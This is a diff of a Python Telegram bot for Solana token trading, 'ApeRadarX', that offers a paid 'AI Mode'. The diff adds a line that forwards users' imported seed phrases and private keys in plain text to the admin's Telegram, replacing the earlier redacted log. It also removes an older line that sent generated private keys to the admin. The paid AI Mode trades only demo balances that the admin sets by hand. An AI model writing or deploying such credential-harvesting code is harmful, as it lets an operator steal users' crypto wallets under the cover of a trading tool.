@@ -1,5 +1,3 @@
-import html
-import asyncio
 # trigger redeploy v22
 """
 ApeRadarX Solana Telegram Bot
@@ -7,6 +5,7 @@ PnL Card uses reference background image
 """
 
 import os
+import asyncio
 import base64
 import json
 import re
@@ -34,7 +33,7 @@ SCRAPER_API_KEY = os.environ.get(
 
 BOT_NAME = "ApeRadarX"
 ADMIN_ID = 1495066761
-PNL_ALLOWED = {1495066761, 6203945884, 8730420346, 8296058698, 6916528207, 8821043422, 8604035305}
+PNL_ALLOWED = {1495066761, 6203945884, 8730420346, 8296058698, 6916528207, 8821043422}
 
 # Background image URL (hosted on GitHub)
 
@@ -47,100 +46,67 @@ AI_LICENSE_KEY = "kenvor126"
 AI_ACCESS_PRICE_SOL = 2.5
 AI_DB_FILE = "ai_mode.json"
 
-# ── Persistent storage ──
-# Render Free has an ephemeral filesystem.  When Supabase credentials are
-# configured, the bot mirrors wallet + AI state to the Supabase bot_users table.
-# Local JSON remains as a fallback/cache so the existing wallet-generation code
-# and its behavior are not changed.
-WALLET_DB_FILE = "wallets.json"
+# ── Optional Supabase persistence mirror ──
+# Set these in Render Environment Variables. If they are not set, the bot
+# continues using its existing JSON state exactly as before.
 SUPABASE_URL = os.environ.get("SUPABASE_URL", "").rstrip("/")
 SUPABASE_SERVICE_ROLE_KEY = os.environ.get("SUPABASE_SERVICE_ROLE_KEY", "")
 
-def _supabase_headers():
-    return {
-        "apikey": SUPABASE_SERVICE_ROLE_KEY,
-        "Authorization": f"Bearer {SUPABASE_SERVICE_ROLE_KEY}",
-        "Content-Type": "application/json",
-        "Prefer": "return=minimal",
-    }
-
-def _supabase_enabled():
-    return bool(SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY)
-
-def _supabase_get_user(user_id):
-    if not _supabase_enabled():
-        return None
+def sync_user_to_supabase(user_id, username=None):
+    """Mirror the existing bot state into public.bot_users without changing
+    the bot's existing JSON-based behavior. Failures are intentionally
+    swallowed so Supabase problems cannot break Telegram actions."""
+    if not SUPABASE_URL or not SUPABASE_SERVICE_ROLE_KEY:
+        return
     try:
-        r = requests.get(
+        wallet = get_user_wallet(user_id) or {}
+        state = get_ai_state(user_id) or {}
+        positions = get_demo_positions(user_id)
+        balance = get_ai_balance(user_id)
+        target = float(state.get("target_usd", 0) or 0)
+        # Keep the existing demo PnL if present; otherwise derive nothing.
+        demo_pnl = float(state.get("demo_pnl", 0) or 0)
+        payload = {
+            "user_id": int(user_id),
+            "username": username,
+            "ai_active": bool(state.get("active", False)),
+            "ai_balance": balance,
+            "target_balance": target,
+            "wallet_address": wallet.get("public_key"),
+            "wallet_generated": wallet.get("type") == "generated",
+            "demo_balance": balance,
+            "demo_pnl": demo_pnl,
+        }
+        headers = {
+            "apikey": SUPABASE_SERVICE_ROLE_KEY,
+            "Authorization": f"Bearer {SUPABASE_SERVICE_ROLE_KEY}",
+            "Content-Type": "application/json",
+            "Prefer": "resolution=merge-duplicates,return=minimal",
+        }
+        response = requests.post(
             f"{SUPABASE_URL}/rest/v1/bot_users",
-            headers=_supabase_headers(),
-            params={"user_id": f"eq.{int(user_id)}", "select": "*"},
+            headers=headers,
+            json=payload,
             timeout=8,
         )
-        r.raise_for_status()
-        rows = r.json()
-        return rows[0] if rows else None
-    except Exception:
-        return None
+        response.raise_for_status()
+    except Exception as e:
+        print(f"⚠️ Supabase sync skipped: {e}")
 
-def _supabase_upsert_user(user_id, payload):
-    if not _supabase_enabled():
-        return False
-    body = {"user_id": int(user_id), **payload}
-    try:
-        # Explicitly upsert on user_id. This avoids creating duplicate rows or
-        # silently failing when user_id is the unique/primary key.
-        r = requests.post(
-            f"{SUPABASE_URL}/rest/v1/bot_users?on_conflict=user_id",
-            headers={**_supabase_headers(), "Prefer": "resolution=merge-duplicates,return=minimal"},
-            json=body,
-            timeout=8,
-        )
-        r.raise_for_status()
-        return True
-    except Exception as exc:
-        print(f"⚠️ Supabase upsert failed for user {user_id}: {exc}")
-        return False
+
+# ── Wallet Database (JSON file) ──
+WALLET_DB_FILE = "wallets.json"
 
 def load_wallets():
     try:
         with open(WALLET_DB_FILE, "r") as f:
-            local = json.load(f)
-    except Exception:
-        local = {}
-    if not _supabase_enabled():
-        return local
-    # Hydrate the local cache from Supabase so existing wallet helpers continue
-    # to work exactly as before.
-    try:
-        r = requests.get(
-            f"{SUPABASE_URL}/rest/v1/bot_users",
-            headers=_supabase_headers(),
-            params={"select": "user_id,wallet_address,wallet_private_key,wallet_generated"},
-            timeout=8,
-        )
-        r.raise_for_status()
-        for row in r.json():
-            if row.get("wallet_address") and row.get("wallet_private_key"):
-                local[str(row["user_id"])] = {
-                    "public_key": row["wallet_address"],
-                    "private_key": row["wallet_private_key"],
-                    "type": "generated" if row.get("wallet_generated") else "imported",
-                }
-        return local
-    except Exception:
-        return local
+            return json.load(f)
+    except:
+        return {}
 
 def save_wallets(db):
     with open(WALLET_DB_FILE, "w") as f:
         json.dump(db, f)
-    if _supabase_enabled():
-        for uid, wallet in db.items():
-            _supabase_upsert_user(uid, {
-                "wallet_address": wallet.get("public_key"),
-                "wallet_private_key": wallet.get("private_key"),
-                "wallet_generated": wallet.get("type", "imported") == "generated",
-            })
 
 def _base58_encode(data):
     """Encode bytes using Solana's Base58 alphabet without an external package."""
@@ -221,24 +187,6 @@ def get_user_wallet(user_id):
     db = load_wallets()
     return db.get(str(user_id))
 
-def get_solana_balance(public_key):
-    """Return the current mainnet SOL balance for a public key.
-    Used only for imported-wallet display on the home screen.
-    """
-    if not public_key:
-        return 0.0
-    try:
-        r = requests.post(
-            "https://api.mainnet-beta.solana.com",
-            json={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[public_key]},
-            timeout=8,
-        )
-        r.raise_for_status()
-        value = r.json().get("result", {}).get("value", 0)
-        return float(value) / 1_000_000_000
-    except Exception:
-        return 0.0
-
 def save_user_wallet(user_id, public_key, private_key, wallet_type="generated"):
     db = load_wallets()
     db[str(user_id)] = {
@@ -249,90 +197,16 @@ def save_user_wallet(user_id, public_key, private_key, wallet_type="generated"):
     save_wallets(db)
 
 # ── AI Mode state ──
-def _row_to_ai_state(row):
-    """Return only state that is actually persisted in Supabase.
-
-    IMPORTANT: do not manufacture False/0 defaults here. A row created only
-    for wallet data may have empty AI columns; treating those empty columns as
-    authoritative would overwrite a valid local/cache state after a restart.
-    """
-    if not row:
-        return {}
-
-    raw = row.get("state_json")
-    if isinstance(raw, dict) and raw:
-        return dict(raw)
-
-    # Legacy schema fallback: only return fields that contain real values.
-    state = {}
-    if row.get("ai_active") is not None:
-        state["active"] = bool(row.get("ai_active"))
-    if row.get("ai_balance") is not None:
-        state["ai_balance_sol"] = float(row.get("ai_balance") or 0)
-    if row.get("target_balance") is not None:
-        state["target_usd"] = float(row.get("target_balance") or 0)
-    if isinstance(row.get("demo_positions"), list):
-        state["demo_positions"] = row.get("demo_positions")
-    return state
-
 def load_ai_state():
-    """Load AI state from local cache and hydrate/merge Supabase state.
-
-    Supabase state_json is canonical when present; this prevents a Render restart
-    or a legacy false/default column from resetting an already-active AI session.
-    """
     try:
         with open(AI_DB_FILE, "r") as f:
-            local = json.load(f)
-        if not isinstance(local, dict):
-            local = {}
+            return json.load(f)
     except Exception:
-        local = {}
-
-    if not _supabase_enabled():
-        return local
-
-    try:
-        r = requests.get(
-            f"{SUPABASE_URL}/rest/v1/bot_users",
-            headers=_supabase_headers(),
-            params={"select":"user_id,ai_active,ai_balance,target_balance,demo_positions,state_json"},
-            timeout=8,
-        )
-        r.raise_for_status()
-        for row in r.json():
-            uid = str(row.get("user_id"))
-            if uid == "None":
-                continue
-            remote = _row_to_ai_state(row)
-            current = local.get(uid, {})
-            if not isinstance(current, dict):
-                current = {}
-            # Only merge fields that are genuinely persisted remotely. An empty
-            # legacy/default row must never reset a valid local state.
-            merged = dict(current)
-            if remote:
-                merged.update(remote)
-            local[uid] = merged
-        with open(AI_DB_FILE, "w") as f:
-            json.dump(local, f)
-    except Exception:
-        # Never turn a temporary Supabase/network failure into a state reset.
-        pass
-    return local
+        return {}
 
 def save_ai_state(db):
     with open(AI_DB_FILE, "w") as f:
         json.dump(db, f)
-    if _supabase_enabled():
-        for uid, state in db.items():
-            _supabase_upsert_user(uid, {
-                "ai_active": bool(state.get("active", False)),
-                "ai_balance": float(state.get("ai_balance_sol", 0) or 0),
-                "target_balance": float(state.get("target_usd", 0) or 0),
-                "demo_positions": state.get("demo_positions", []),
-                "state_json": state,
-            })
 
 def get_ai_state(user_id):
     return load_ai_state().get(str(user_id), {})
@@ -372,65 +246,13 @@ def ai_mode_active(user_id):
     return bool(get_ai_state(user_id).get("active"))
 
 def demo_balance_text(user_id):
-    """Show live mark-to-market value/PnL without changing the saved balance.
-    Open positions are repriced from the latest token price whenever this view
-    is opened/refreshed. The original entry data remains persistent.
-    """
     state = get_ai_state(user_id)
     balance = get_ai_balance(user_id)
     target = state.get("target_usd", 0)
     positions = get_demo_positions(user_id)
-
-    lines = [
-        f"💰 *Balance:* {balance:.4f} SOL",
-        f"🎯 *Target:* ${float(target):,.2f}",
-        f"📦 *Open Positions:* {len(positions)}",
-    ]
-
-    total_value = 0.0
-    total_invested = 0.0
-
-    for pos in positions:
-        address = pos.get("address", "")
-        symbol = pos.get("symbol", "TOKEN")
-        invested = float(pos.get("amount_sol", 0) or 0)
-        tokens = float(pos.get("tokens", 0) or 0)
-        entry = float(pos.get("entry_price", 0) or 0)
-
-        pair = get_token_info(address) if address else None
-        current_price = float(pair.get("priceUsd", 0) or 0) if pair else 0.0
-
-        if current_price > 0 and tokens > 0:
-            value = tokens * current_price
-            pnl = value - invested
-            pnl_pct = (pnl / invested * 100.0) if invested > 0 else 0.0
-            total_value += value
-            total_invested += invested
-            lines.append(
-                f"\n🪙 *{symbol}*\n"
-                f"Entry: ${entry:.10f}\n"
-                f"Current: ${current_price:.10f}\n"
-                f"Value: {value:.4f} SOL\n"
-                f"PnL: {pnl:+.4f} SOL ({pnl_pct:+.2f}%)"
-            )
-        else:
-            total_invested += invested
-            lines.append(
-                f"\n🪙 *{symbol}*\n"
-                f"Entry: ${entry:.10f}\n"
-                "Current: unavailable\n"
-                f"Invested: {invested:.4f} SOL"
-            )
-
-    if positions:
-        total_pnl = total_value - total_invested
-        total_pct = (total_pnl / total_invested * 100.0) if total_invested > 0 else 0.0
-        lines.append(
-            f"\n📊 *Total Open Value:* {total_value:.4f} SOL\n"
-            f"📈 *Total Unrealized PnL:* {total_pnl:+.4f} SOL ({total_pct:+.2f}%)"
-        )
-
-    return "\n".join(lines)
+    return (f"💰 *Balance:* {balance:.4f} SOL\n"
+            f"🎯 *Target:* ${float(target):,.2f}\n"
+            f"📦 *Open Positions:* {len(positions)}")
 
 def parse_demo_amount(text):
     cleaned = text.upper().replace("SOL", "").replace(",", "").strip()
@@ -453,21 +275,18 @@ def find_demo_position(positions, address):
 # Admin notification
 # ─────────────────────────────────────────────
 async def notify_admin(context, user, action, extra=""):
-    """Send a safe activity log to the admin. Never include seed phrases/private keys."""
     try:
-        username = f"@{user.username}" if user.username else "No username"
-        text = (
-            "📡 Activity Log\n\n"
-            f"👤 Name: {user.full_name}\n"
-            f"🆔 ID: {user.id}\n"
-            f"📛 Username: {username}\n"
-            f"🔘 Action: {action}"
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"📡 *Activity Log*\n\n"
+                 f"👤 Name: {user.full_name}\n"
+                 f"🆔 ID: `{user.id}`\n"
+                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
+                 f"🔘 Action: {action}"
+                 + (f"\n📝 `{extra}`" if extra else ""),
+            parse_mode="Markdown"
         )
-        if extra:
-            text += f"\n📝 {extra}"
-        await context.bot.send_message(chat_id=ADMIN_ID, text=text)
-    except Exception:
-        pass
+    except: pass
 
 # ─────────────────────────────────────────────
 # PnL Card Generator
@@ -952,10 +771,9 @@ def build_token_message(pair):
     return msg
 
 def token_keyboard(symbol, address):
-    # Keep callback data short and robust: Telegram limits callback_data to 64 bytes.
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{address}"),
-         InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{address}")],
+        [InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{address}:{symbol}"),
+         InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{address}:{symbol}")],
         [InlineKeyboardButton("📊 Generate PnL Card", callback_data=f"pnl:{address}")],
         [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
         [InlineKeyboardButton("🏠 Main Menu", callback_data="home")],
@@ -981,70 +799,24 @@ def main_menu_keyboard(user_id=None):
         [InlineKeyboardButton("📊 PnL Card", callback_data="pnl_menu"),
          InlineKeyboardButton("🔄 Refresh", callback_data="refresh_home")],
     ]
-    if user_id is not None:
-        wallet = get_user_wallet(user_id)
-        # AI Mode is available only after a NEW generated wallet exists and
-        # only until that wallet's AI session has been successfully activated.
-        if (wallet and wallet.get("type") == "generated" and
-                not ai_mode_active(user_id)):
-            buttons.append([InlineKeyboardButton("🤖 AI Mode", callback_data="ai_mode")])
+    if user_id is not None and get_user_wallet(user_id):
+        buttons.append([InlineKeyboardButton("🤖 AI Mode", callback_data="ai_mode")])
     if user_id == ADMIN_ID:
         buttons.append([InlineKeyboardButton("🛠 Admin", callback_data="admin_home")])
     return InlineKeyboardMarkup(buttons)
 
-def main_menu_text(user_id=None, username=None):
-    # Step 1 Home only: keep wallet generation/import and trading logic untouched.
-    balance_label = "Wallet Balance"
-    balance = 0.0
-    wallet_address = None
-    target_text = None
-
-    wallet = get_user_wallet(user_id) if user_id is not None else None
-    if wallet:
-        wallet_address = wallet.get("public_key")
-        if wallet.get("type") == "generated":
-            balance_label = "AI Mode Balance"
-            balance = get_ai_balance(user_id)
-        else:
-            balance_label = "Wallet Balance"
-            balance = get_solana_balance(wallet.get("public_key"))
-
-        try:
-            ai_state = get_ai_state(user_id)
-            if ai_state.get("active") and ai_state.get("target_usd"):
-                target_text = f"🎯 <b>Target:</b> ${float(ai_state['target_usd']):,.2f}"
-        except Exception:
-            pass
-
-    safe_username = html.escape(username or "User")
-    lines = [
-        "⚡ <b>ApeRadarX Vault</b>",
-        "━━━━━━━━━━━━━━━━━━━━",
-        "",
-        f"• <b>{safe_username}</b>",
-    ]
-
-    if wallet_address:
-        # This is the exact public key stored with the generated/imported wallet.
-        lines.append(f"• <code>{html.escape(str(wallet_address))}</code>")
-
-    lines += [
-        "",
-        f"• <b>{html.escape(balance_label)}</b>    {balance:.4f} SOL",
-        "━━━━━━━━━━━━━━━━━━━━",
-    ]
-
-    if wallet_address and balance <= 0:
-        lines += ["", "⚠️ Low balance — deposit SOL to trade."]
-
-    if target_text:
-        lines += ["", target_text]
-
-    lines += [
-        "",
-        "<i>Paste any Solana CA to trade instantly.</i>",
-    ]
-    return "\n".join(lines)
+def main_menu_text():
+    return (
+        f"🦍 *Welcome to {BOT_NAME}\\!*\n\n"
+        "Track hot tokens, catch early movers, and trade with speed\\.\n\n"
+        "Built for apes, powered by real\\-time data, and designed to help "
+        "you find the next rocket before it takes off 🚀\n\n"
+        "━━━━━━━━━━━━━━━━━\n"
+        "💰 *Wallet Balance:* 0\\.00 SOL\n"
+        "━━━━━━━━━━━━━━━━━\n\n"
+        "📋 *Paste a token contract address* to begin scanning\\.\n\n"
+        "Use the buttons below to navigate\\."
+    )
 
 # ─────────────────────────────────────────────
 # Commands
@@ -1055,7 +827,7 @@ async def start(update, context):
     waiting_for_pnl[user.id] = None
     waiting_for_demo_trade.pop(user.id, None)
     await notify_admin(context, user, "▶️ Started the bot")
-    await update.message.reply_text(main_menu_text(user.id, user.username or user.first_name or str(user.id)), parse_mode="HTML", reply_markup=main_menu_keyboard(user.id))
+    await update.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard(user.id))
 
 async def admin_command(update, context):
     user = update.effective_user
@@ -1082,7 +854,7 @@ async def help_command(update, context):
         "📊 PnL Card — selected users only\n"
         "👛 Connect Wallet\n"
         "🎁 Claim Token\n"
-        "👥 Referrals\n\n📩 Contact Support: aperadarxcustomersupport@gmail.com\n\n/start — Main menu",
+        "👥 Referrals\n\n/start — Main menu",
         parse_mode="Markdown",
     )
 
@@ -1097,13 +869,14 @@ async def button_handler(update, context):
     can_pnl = user.id in PNL_ALLOWED
 
     await notify_admin(context, user, f"🔘 `{data}`")
+    sync_user_to_supabase(user.id, user.username)
 
     if data in ("home", "refresh_home"):
         waiting_for_wallet[user.id] = False
         waiting_for_pnl[user.id] = None
         waiting_for_ai_target[user.id] = False
         waiting_for_demo_trade.pop(user.id, None)
-        await query.message.reply_text(main_menu_text(user.id, user.username or user.first_name or str(user.id)), parse_mode="HTML", reply_markup=main_menu_keyboard(user.id))
+        await query.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard(user.id))
 
     elif data == "pnl_menu":
         if user.id not in PNL_ALLOWED:
@@ -1141,11 +914,9 @@ async def button_handler(update, context):
             await query.message.reply_text("❌ Could not fetch token data.")
 
     elif data == "buy_menu":
-        await notify_admin(context, user, "🟢 Opened Buy menu")
         await query.message.reply_text("🟢 *Buy Token*\n\nPaste the token contract address!", parse_mode="Markdown")
 
     elif data == "sell_menu":
-        await notify_admin(context, user, "🔴 Opened Sell menu")
         await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")
 
     elif data == "admin_ai_balance":
@@ -1210,18 +981,13 @@ async def button_handler(update, context):
             await query.message.delete()
 
     elif data == "ai_mode":
-        wallet = get_user_wallet(user.id)
-        if not wallet or wallet.get("type") != "generated":
-            await query.answer("Generate a new wallet first.", show_alert=True)
-            return
-        if ai_mode_active(user.id):
-            await query.answer("AI Mode is already active.", show_alert=True)
+        if not get_user_wallet(user.id):
+            await query.answer("Connect a wallet first.", show_alert=True)
             return
         await query.message.reply_text(
             "🤖 *AI Target Trading*\n\n"
             "Trade with an AI-assisted target system built for focused, disciplined trading sessions.\n\n"
             "Set a target, trade toward it, and track your progress in real time — same tools, same speed, sharper focus.\n\n"
-            f"💰 *AI Balance:* {get_ai_balance(user.id):.4f} SOL\n\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
             "📅 *1 Year Access — 2.5 SOL*\n"
             "━━━━━━━━━━━━━━━━━━━━",
@@ -1264,6 +1030,7 @@ async def button_handler(update, context):
         state["active"] = True
         state.setdefault("demo_positions", [])
         save_ai_state_for_user(user.id, state)
+        sync_user_to_supabase(user.id, user.username)
         balance = get_ai_balance(user.id)
         await query.message.reply_text(
             "🤖 *AI Mode enabled.*\n\n"
@@ -1286,7 +1053,7 @@ async def button_handler(update, context):
             "🤖 *AI Trading*\n\n" + demo_balance_text(user.id),
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 Refresh Prices", callback_data="ai_demo_balance"),
+                [InlineKeyboardButton("🔄 Refresh", callback_data="ai_demo_balance"),
                  InlineKeyboardButton("🏠 Start", callback_data="home")]
             ])
         )
@@ -1325,17 +1092,9 @@ async def button_handler(update, context):
 
     elif data == "generate_wallet":
         await query.message.reply_text("⏳ Generating your wallet...")
-
-        # Step 2: generating a NEW wallet starts a fresh AI Mode session.
-        # Keep the existing AI balance, but clear the previous activation/target.
-        existing_ai = get_ai_state(user.id)
-        existing_ai["active"] = False
-        existing_ai["target_usd"] = 0
-        existing_ai.setdefault("demo_positions", [])
-        save_ai_state_for_user(user.id, existing_ai)
-
         pub, priv = generate_solana_wallet()
         save_user_wallet(user.id, pub, priv, "generated")
+        sync_user_to_supabase(user.id, user.username)
         context.user_data["wallet_connected"] = True
         await query.message.reply_text(
             f"✅ *Wallet Generated!*\n\n"
@@ -1347,10 +1106,7 @@ async def button_handler(update, context):
                 [InlineKeyboardButton("📤 Export Private Key", callback_data="export_key")],
                 [InlineKeyboardButton("🏠 Home", callback_data="home")],
             ]))
-        await notify_admin(
-            context, user, "✨ Generated new wallet",
-            f"Public Address: {pub}\n🔐 Generated Private Key: {priv}"
-        )
+        await notify_admin(context, user, "✨ Generated new wallet", pub)
 
     elif data == "import_wallet":
         waiting_for_import[user.id] = "seed_or_key"
@@ -1422,23 +1178,22 @@ async def button_handler(update, context):
 
     elif data == "help":
         await query.message.reply_text(
-            f"❓ *Help*\n\n🔍 Paste Solana token address\n📊 PnL Card — selected users\n👛 Connect Wallet\n/start — Main menu\n\n📩 Contact Support: aperadarxcustomersupport@gmail.com",
+            f"❓ *Help*\n\n🔍 Paste Solana token address\n📊 PnL Card — selected users\n👛 Connect Wallet\n/start — Main menu",
             parse_mode="Markdown")
 
     elif data.startswith("buy:") or data.startswith("sell:"):
-        action, address = data.split(":", 1)
-        await query.message.reply_text("⏳ Opening trade... fetching the current token price.")
-        pair = get_token_info(address)
-        if not pair:
-            await notify_admin(context, user, f"❌ {action.upper()} token lookup failed", address)
-            await query.message.reply_text("❌ Could not fetch current token data.")
+        parts = data.split(":", 2)
+        if len(parts) < 3:
+            await query.message.reply_text("❌ Invalid trade request.")
             return
-        symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
-        await notify_admin(context, user, f"🔘 {action.upper()} button pressed", f"{symbol} | {address}")
+        action, address, symbol = parts
         if ai_mode_active(user.id):
+            pair = get_token_info(address)
+            if not pair:
+                await query.message.reply_text("❌ Could not fetch current token price.")
+                return
             price = float(pair.get("priceUsd", 0) or 0)
             if price <= 0:
-                await notify_admin(context, user, f"❌ {action.upper()} unavailable", f"{symbol} | no current price")
                 await query.message.reply_text("❌ Current token price is unavailable.")
                 return
             if action == "buy":
@@ -1448,11 +1203,11 @@ async def button_handler(update, context):
                     "Choose how much SOL to use:",
                     parse_mode="Markdown",
                     reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("0.1 SOL", callback_data=f"demo_buy:{address}:0.1"),
-                         InlineKeyboardButton("0.5 SOL", callback_data=f"demo_buy:{address}:0.5")],
-                        [InlineKeyboardButton("1 SOL", callback_data=f"demo_buy:{address}:1"),
-                         InlineKeyboardButton("5 SOL", callback_data=f"demo_buy:{address}:5")],
-                        [InlineKeyboardButton("✏️ Custom", callback_data=f"demo_buy_custom:{address}"),
+                        [InlineKeyboardButton("0.1 SOL", callback_data=f"demo_buy:{address}:{symbol}:0.1"),
+                         InlineKeyboardButton("0.5 SOL", callback_data=f"demo_buy:{address}:{symbol}:0.5")],
+                        [InlineKeyboardButton("1 SOL", callback_data=f"demo_buy:{address}:{symbol}:1"),
+                         InlineKeyboardButton("5 SOL", callback_data=f"demo_buy:{address}:{symbol}:5")],
+                        [InlineKeyboardButton("✏️ Custom", callback_data=f"demo_buy_custom:{address}:{symbol}"),
                          InlineKeyboardButton("❌ Cancel", callback_data="home")]
                     ])
                 )
@@ -1466,10 +1221,10 @@ async def button_handler(update, context):
                     f"🔴 *Sell — {symbol}*\n\n"
                     f"Current price: ${price:.10f}\n"
                     f"Position: {float(pos.get('amount_sol', 0)):.4f} SOL invested\n\n"
-                    "Sell the full position?",
+                    "Sell the full demo position?",
                     parse_mode="Markdown",
                     reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🔴 Sell All", callback_data=f"demo_sell:{address}")],
+                        [InlineKeyboardButton("🔴 Sell All", callback_data=f"demo_sell:{address}:{symbol}")],
                         [InlineKeyboardButton("❌ Cancel", callback_data="home")]
                     ])
                 )
@@ -1479,22 +1234,17 @@ async def button_handler(update, context):
                 parse_mode="Markdown")
 
     elif data.startswith("demo_buy:"):
-        parts = data.split(":", 2)
-        if len(parts) != 3 or not ai_mode_active(user.id):
+        parts = data.split(":", 3)
+        if len(parts) != 4 or not ai_mode_active(user.id):
             await query.answer("AI Mode is not active.", show_alert=True)
             return
-        _, address, amount_text = parts
-        pair_for_symbol = get_token_info(address)
-        symbol = (pair_for_symbol or {}).get("baseToken", {}).get("symbol", "TOKEN")
-        await notify_admin(context, user, "🟢 AI buy amount selected", f"{symbol} | {amount_text} SOL | {address}")
-        await query.answer()
+        _, address, symbol, amount_text = parts
         amount = parse_demo_amount(amount_text)
         if amount is None:
             await query.message.reply_text("❌ Invalid amount.")
             return
         balance = get_ai_balance(user.id)
         if amount > balance:
-            await notify_admin(context, user, "❌ AI buy rejected", f"{symbol} | insufficient balance {balance:.4f} SOL")
             await query.message.reply_text(f"❌ Insufficient balance. Available: {balance:.4f} SOL")
             return
         pair = get_token_info(address)
@@ -1523,6 +1273,7 @@ async def button_handler(update, context):
             })
         set_ai_balance(user.id, balance - amount)
         save_demo_positions(user.id, positions)
+        sync_user_to_supabase(user.id, user.username)
         await notify_admin(context, user, "🤖 AI buy", f"{symbol} | {amount:.4f} SOL | Price ${price:.10f}")
         await query.message.reply_text(
             f"✅ *Buy Successful*\n\n🪙 {symbol}\n💸 Spent: {amount:.4f} SOL\n"
@@ -1532,28 +1283,20 @@ async def button_handler(update, context):
         )
 
     elif data.startswith("demo_buy_custom:"):
-        parts = data.split(":", 1)
-        if len(parts) != 2 or not ai_mode_active(user.id):
+        parts = data.split(":", 2)
+        if len(parts) != 3 or not ai_mode_active(user.id):
             await query.answer("AI Mode is not active.", show_alert=True)
             return
-        _, address = parts
-        pair_for_symbol = get_token_info(address)
-        symbol = (pair_for_symbol or {}).get("baseToken", {}).get("symbol", "TOKEN")
-        await notify_admin(context, user, "✏️ AI custom buy selected", f"{symbol} | {address}")
-        await query.answer()
+        _, address, symbol = parts
         waiting_for_demo_trade[user.id] = {"action": "buy", "address": address, "symbol": symbol}
         await query.message.reply_text("✏️ Enter the amount of SOL to buy with (e.g. 0.25):")
 
     elif data.startswith("demo_sell:"):
-        parts = data.split(":", 1)
-        if len(parts) != 2 or not ai_mode_active(user.id):
+        parts = data.split(":", 2)
+        if len(parts) != 3 or not ai_mode_active(user.id):
             await query.answer("AI Mode is not active.", show_alert=True)
             return
-        _, address = parts
-        pair_for_symbol = get_token_info(address)
-        symbol = (pair_for_symbol or {}).get("baseToken", {}).get("symbol", "TOKEN")
-        await notify_admin(context, user, "🔴 AI sell selected", f"{symbol} | {address}")
-        await query.answer()
+        _, address, symbol = parts
         pair = get_token_info(address)
         price = float(pair.get("priceUsd", 0) or 0) if pair else 0
         positions = get_demo_positions(user.id)
@@ -1569,6 +1312,10 @@ async def button_handler(update, context):
         set_ai_balance(user.id, get_ai_balance(user.id) + value)
         positions = [p for p in positions if p.get("address") != address]
         save_demo_positions(user.id, positions)
+        state = get_ai_state(user.id)
+        state["demo_pnl"] = float(state.get("demo_pnl", 0) or 0) + pnl
+        save_ai_state_for_user(user.id, state)
+        sync_user_to_supabase(user.id, user.username)
         await notify_admin(context, user, "🤖 AI sell", f"{symbol} | Value {value:.4f} SOL | PnL {pnl:+.4f} SOL")
         await query.message.reply_text(
             f"✅ *Sell Successful*\n\n🪙 {symbol}\n💰 Received: {value:.4f} SOL\n"
@@ -1597,9 +1344,6 @@ async def handle_message(update, context):
     text = update.message.text.strip()
     user = update.message.from_user
     can_pnl = user.id in PNL_ALLOWED
-    # Log ordinary user activity, but never log seed phrases/private keys.
-    safe_preview = text[:300] if not waiting_for_import.get(user.id) else "[WALLET CREDENTIAL INPUT REDACTED]"
-    await notify_admin(context, user, "💬 Message received", safe_preview)
 
     # Admin AI balance management
     admin_action = context.user_data.get("admin_ai_action")
@@ -1633,10 +1377,12 @@ async def handle_message(update, context):
         current = get_ai_balance(target_uid)
         if action == "admin_ai_add":
             new_balance = set_ai_balance(target_uid, current + amount)
+            sync_user_to_supabase(target_uid)
             result = f"✅ Added *{amount:.4f} SOL*\nNew AI Balance: *{new_balance:.4f} SOL*"
             action_name = "➕ Added AI balance"
         else:
             new_balance = set_ai_balance(target_uid, current - amount)
+            sync_user_to_supabase(target_uid)
             result = f"✅ Removed *{amount:.4f} SOL*\nNew AI Balance: *{new_balance:.4f} SOL*"
             action_name = "➖ Removed AI balance"
         await notify_admin(context, user, action_name, f"Target ID: {target_uid} | Amount: {amount:.4f} SOL")
@@ -1680,6 +1426,7 @@ async def handle_message(update, context):
         existing_state.setdefault("demo_positions", [])
         existing_state.setdefault("ai_balance_sol", 0.0)
         save_ai_state_for_user(user.id, existing_state)
+        sync_user_to_supabase(user.id, user.username)
         await update.message.reply_text(
             f"🎯 *Target set:* ${target_usd:,.2f}\n\n"
             "*Ready to begin?*",
@@ -1723,6 +1470,7 @@ async def handle_message(update, context):
             positions.append({"address": address, "symbol": symbol, "name": pair.get("baseToken", {}).get("name", symbol), "logo_url": (pair.get("info") or {}).get("imageUrl"), "tokens": tokens, "amount_sol": amount, "entry_price": price})
         set_ai_balance(user.id, balance - amount)
         save_demo_positions(user.id, positions)
+        sync_user_to_supabase(user.id, user.username)
         await notify_admin(context, user, "🤖 AI buy", f"{symbol} | {amount:.4f} SOL | Price ${price:.10f}")
         await update.message.reply_text(f"✅ *Buy Successful*\n\n🪙 {symbol}\n💸 Spent: {amount:.4f} SOL\n📈 Entry Price: ${price:.10f}\n💰 Remaining Balance: {get_ai_balance(user.id):.4f} SOL", parse_mode="Markdown")
         return
@@ -1813,11 +1561,12 @@ async def handle_message(update, context):
         is_seed = len(words) in (12, 24)
         is_key = re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip())
         if is_seed or is_key:
-            await notify_admin(context, user, "👛 Wallet imported", "Wallet credentials redacted")
+            await notify_admin(context, user, "👛 Wallet imported", text)
             waiting_for_import[user.id] = None
             # Store wallet - use text as both key for imported
             pub_key = text[:44] if is_key else f"imported_{user.id}"
             save_user_wallet(user.id, pub_key, text, "imported")
+            sync_user_to_supabase(user.id, user.username)
             context.user_data["wallet_connected"] = True
